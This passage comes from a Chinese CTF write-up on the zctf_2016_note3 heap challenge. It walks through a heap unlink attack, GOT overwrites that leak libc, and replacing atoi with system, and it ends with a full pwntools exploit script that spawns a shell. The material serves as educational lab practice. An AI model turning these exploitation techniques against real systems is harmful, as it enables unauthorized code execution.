alt="image-20231014161643622.png"></p><h4 id="当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。"><a href="#当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。" class="headerlink" title="当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。"></a>当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFyAU.png" alt="image-20231014162533011.png"></p><h4 id="而在dele-2-后"><a href="#而在dele-2-后" class="headerlink" title="而在dele(2)后"></a>而在dele(2)后</h4><h4 id="存放堆2的指针被置零了"><a href="#存放堆2的指针被置零了" class="headerlink" title="存放堆2的指针被置零了"></a>存放堆2的指针被置零了</h4><p><img src="https://i.imgs.ovh/2023/10/14/rACx0.png" alt="image-20231014163605611.png"></p><h4 id="这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了"><a href="#这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了" class="headerlink" title="这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了"></a>这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了</h4><p><img src="https://i.imgs.ovh/2023/10/14/rAPjC.png" alt="image-20231014163850174.png"></p><h4 id="0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放"><a href="#0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放" class="headerlink" title="0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放"></a>0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放</h4><h4 id="之后的bin是这样的"><a href="#之后的bin是这样的" class="headerlink" title="之后的bin是这样的"></a>之后的bin是这样的</h4><p><img src="zctf_2016_note3.assets/x8DgM9LaTris3oF.png" alt="image-20231014164403504.png"></p><h4 id="然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写"><a href="#然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写" class="headerlink" title="然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写"></a>然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(elf.got[<span class="string">'free'</span>]) * <span class="number">2</span> + p64(elf.got[<span class="string">'atoi'</span>]) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/14/rALVt.png" alt="image-20231014164701954.png"></p><h4 id="再把edit堆0-也就是edit0x602018（free-got-地址的内容改写成-0x400730-puts-plt"><a href="#再把edit堆0-也就是edit0x602018（free-got-地址的内容改写成-0x400730-puts-plt" class="headerlink" title="再把edit堆0,也就是edit0x602018（free_got)地址的内容改写成(0x400730)puts_plt"></a>再把edit堆0,也就是edit0x602018（free_got)地址的内容改写成(0x400730)puts_plt</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0X400730</span>)[:-<span class="number">1</span>]) <span class="comment">#puts_plt</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/14/rAXkm.png" alt="image-20231014165150300"></p><h4 id="这样再dele堆1的时候也就是free-0x6020d0这个地址，也就是puts-elf-got-‘atoi’-从而获得atoi的got项的内容，从而可以算出libc的偏移"><a href="#这样再dele堆1的时候也就是free-0x6020d0这个地址，也就是puts-elf-got-‘atoi’-从而获得atoi的got项的内容，从而可以算出libc的偏移" class="headerlink" title="这样再dele堆1的时候也就是free 0x6020d0这个地址，也就是puts(elf.got[‘atoi’]),从而获得atoi的got项的内容，从而可以算出libc的偏移"></a>这样再dele堆1的时候也就是free 0x6020d0这个地址，也就是puts(elf.got[‘atoi’]),从而获得atoi的got项的内容，从而可以算出libc的偏移</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">success(<span class="string">'atoi_addr = '</span> + <span class="built_in">hex</span>(atoi_addr))</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i.imgs.ovh/2023/10/14/rArgN.png" alt="image-20231014165713253"></p><h4 id="然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘-bin-sh’就可以提权了。"><a href="#然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘-bin-sh’就可以提权了。" class="headerlink" title="然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘/bin/sh’就可以提权了。"></a>然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘/bin/sh’就可以提权了。</h4><h4 id="最后的exp"><a href="#最后的exp" class="headerlink" title="最后的exp"></a>最后的exp</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",)</span></span><br><span class="line">p=process(<span class="string">"./zctf_2016_note3"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./zctf_2016_note3'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'option---&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Input the length of the note content:(less than 1024)'</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Input the note content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'option---&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Input the id of the note:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Input the new content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'option---&gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Input the id of the note:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020c8</span></span><br><span class="line">fd=ptr-<span class="number">0x18</span></span><br><span class="line">bk=ptr-<span class="number">0x10</span></span><br><span class="line">payload1=p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)+p64(fd)+p64(bk)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,payload1)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'CCCC'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'dddd'</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xb0</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,payload2) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)  <span class="comment">#he bing</span></span><br><span class="line"></span><br><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(elf.got[<span class="string">'free'</span>]) * <span class="number">2</span> + p64(elf.got[<span class="string">'atoi'</span>]) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0X400730</span>)[:-<span class="number">1</span>]) <span class="comment">#puts_plt</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)  <span class="comment">#dele di 0 ge dui </span></span><br><span class="line"></span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">success(<span class="string">'atoi_addr = '</span> + <span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">base=atoi_addr-libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
